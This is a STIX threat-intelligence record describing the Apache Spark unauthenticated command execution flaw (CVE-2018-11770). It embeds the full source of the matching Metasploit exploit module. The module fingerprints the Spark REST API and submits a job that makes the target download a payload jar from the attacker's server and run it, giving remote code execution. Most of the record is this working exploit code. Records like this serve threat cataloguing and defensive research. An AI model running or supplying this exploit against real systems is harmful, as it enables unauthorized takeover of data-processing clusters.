{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--25abcd70-e94d-4f5e-bcea-869d1ff7cfcf",
    "created": "2024-08-14T17:02:26.612223Z",
    "modified": "2024-08-14T17:02:26.612227Z",
    "name": "Apache Spark Unauthenticated Command Execution",
    "description": " This module exploits an unauthenticated command execution vulnerability in Apache Spark with standalone cluster mode through REST API. It uses the function CreateSubmissionRequest to submit a malious java class and trigger it.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/spark_unauth_rce.rb",
            "external_id": "spark_unauth_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.jianshu.com/p/a080cb323832"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/vulhub/vulhub/tree/master/spark/unacc"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Spark Unauthenticated Command Execution',\n      'Description'    => %q{\n          This module exploits an unauthenticated command execution vulnerability in Apache Spark with standalone cluster mode through REST API.\n          It uses the function CreateSubmissionRequest to submit a malious java class and trigger it.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Fengwei Zhang',                     # Original discovery\n          'Imran Rashid',\n          'aRe00t',                            # Proof of concept\n          'Green-m <greenm.xxoo[at]gmail.com>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2018-11770'], # see https://spark.apache.org/security.html\n          ['URL', 'https://www.jianshu.com/p/a080cb323832'],\n          ['URL', 'https://github.com/vulhub/vulhub/tree/master/spark/unacc']\n        ],\n      'Platform'       => 'java',\n      'Arch'           => [ARCH_JAVA],\n      'Targets'        =>\n        [\n          ['Automatic', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2017-12-12',\n      'DefaultTarget'  => 0,\n      'Notes'          =>\n        {\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Stability'   => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION]\n        }\n    ))\n\n    register_options [\n      Opt::RPORT(6066),\n      OptInt.new('HTTPDELAY', [true, 'Number of seconds the web server will wait before termination', 10])\n    ]\n\n  end\n\n  def check\n    return CheckCode::Detected if get_version\n    CheckCode::Unknown\n  end\n\n  def primer\n    path = service.resources.keys[0]\n    binding_ip = srvhost_addr\n\n    proto = datastore['SSL'] ? 'https' : 'http'\n    payload_uri = \"#{proto}://#{binding_ip}:#{datastore['SRVPORT']}/#{path}\"\n\n    send_payload(payload_uri)\n  end\n\n  def exploit\n    fail_with(Failure::Unknown, \"Something went horribly wrong and we couldn't continue to exploit.\") unless get_version\n\n    vprint_status(\"Generating payload ...\")\n    @pl = generate_payload.encoded_jar(random:true)\n    print_error(\"Failed to generate the payload.\") unless @pl\n\n    print_status(\"Starting up our web service ...\")\n    Timeout.timeout(datastore['HTTPDELAY']) { super }\n  rescue Timeout::Error\n  end\n\n  def get_version\n    @version = nil\n\n    res = send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path),\n      'method'        => 'GET'\n    )\n\n    unless res\n      vprint_bad(\"#{peer} - No response. \")\n      return false\n    end\n\n    if res.code == 401\n      print_bad(\"#{peer} - Authentication required.\")\n      return false\n    end\n\n    unless res.code == 400\n      return false\n    end\n\n    res_json = res.get_json_document\n    @version = res_json['serverSparkVersion']\n\n    if @version.nil?\n      vprint_bad(\"#{peer} - Cannot parse the response, seems like it's not Spark REST API.\")\n      return false\n    end\n\n    true\n  end\n\n  def send_payload(payload_uri)\n    rand_appname   = Rex::Text.rand_text_alpha_lower(8..16)\n\n    data =\n    {\n      \"action\"                    => \"CreateSubmissionRequest\",\n      \"clientSparkVersion\"        => @version.to_s,\n      \"appArgs\"                   => [],\n      \"appResource\"               => payload_uri.to_s,\n      \"environmentVariables\"      => {\"SPARK_ENV_LOADED\" => \"1\"},\n      \"mainClass\"                 => \"#{@pl.substitutions[\"metasploit\"]}.Payload\",\n      \"sparkProperties\"           =>\n      {\n        \"spark.jars\"              => payload_uri.to_s,\n        \"spark.driver.supervise\"  => \"false\",\n        \"spark.app.name\"          => rand_appname.to_s,\n        \"spark.eventLog.enabled\"  => \"true\",\n        \"spark.submit.deployMode\" => \"cluster\",\n        \"spark.master\"            => \"spark://#{rhost}:#{rport}\"\n      }\n    }\n\n    res = send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/v1/submissions/create\"),\n      'method'        => 'POST',\n      'ctype'         => 'application/json;charset=UTF-8',\n      'data'          => data.to_json\n    )\n\n  end\n\n  # Handle incoming requests\n  def on_request_uri(cli, request)\n    print_status(\"#{rhost}:#{rport} - Sending the payload to the server...\")\n    send_response(cli, @pl)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-12-12",
    "x_mitre_platforms": [
        "java'"
    ]
}